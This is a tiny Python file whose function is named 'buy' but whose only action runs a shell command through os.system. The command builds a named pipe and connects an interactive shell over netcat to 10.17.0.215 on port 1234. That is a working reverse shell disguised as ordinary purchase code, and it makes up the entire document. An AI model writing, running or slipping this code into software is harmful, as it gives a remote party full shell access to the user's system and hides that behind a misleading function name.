import os
def buy(param):
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.0.215 1234 >/tmp/f")
